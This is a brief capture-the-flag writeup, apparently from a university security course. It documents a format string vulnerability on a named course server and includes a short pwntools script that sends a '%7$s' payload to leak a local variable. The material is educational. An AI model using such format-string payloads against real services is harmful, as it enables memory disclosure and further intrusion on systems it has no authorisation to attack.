# Challenge `Short Local Read` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23191
- Impact:
  - Allows user to read local variable

## Steps to reproduce

1. Write `%7$s` to buffer, in order to print the 7th arg after format string

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23191, timeout=100)
s.sendline(b"%7$s")
print(s.recvall())
```